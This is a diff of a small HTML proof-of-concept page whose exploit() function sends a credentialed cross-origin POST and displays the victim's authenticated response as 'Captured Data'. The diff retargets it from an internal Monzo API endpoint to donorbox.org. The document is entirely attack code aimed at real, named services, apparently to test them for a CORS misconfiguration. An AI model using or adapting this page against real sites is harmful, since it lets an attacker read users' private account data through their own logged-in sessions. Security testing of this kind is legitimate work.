@@ -12,31 +12,27 @@
     <script>
         function exploit() {
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://internal-api.monzo.com/analytics/track', true);
+            xhr.open('POST', 'https://donorbox.org', true);
             xhr.withCredentials = true;
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.setRequestHeader('Accept', 'application/json');
+            xhr.setRequestHeader('Content-Type', 'application/json'); // Ensure correct content type
+            xhr.setRequestHeader('Accept', 'application/json'); // Expecting JSON response
 
-            // Example payload, adjust as necessary
-            var data = JSON.stringify({ event: "test-event", validField: "validValue" });
+            // Update the data payload according to what the API expects
+            var data = JSON.stringify({ event: "test-event", validField: "validValue" }); // Adjust fields as needed
 
             xhr.onload = function () {
                 if (xhr.status === 200) {
                     var responseData = xhr.responseText;
                     document.getElementById('response').textContent = 'Captured Data:\n' + responseData;
                 } else {
-                    // Log the error response
                     console.error('Request failed:', xhr.status, xhr.statusText);
-                    document.getElementById('response').textContent = 'Error: ' + xhr.status + ' ' + xhr.statusText;
                 }
             };
 
             xhr.onerror = function () {
                 console.error('An error occurred during the request.');
-                document.getElementById('response').textContent = 'Network error occurred.';
             };
 
-            console.log('Sending request with payload:', data); // Debugging: Log the payload
             xhr.send(data);
         }
 
@@ -48,4 +44,3 @@
     <div id="response">Waiting for data...</div>
 </body>
 </html>
-
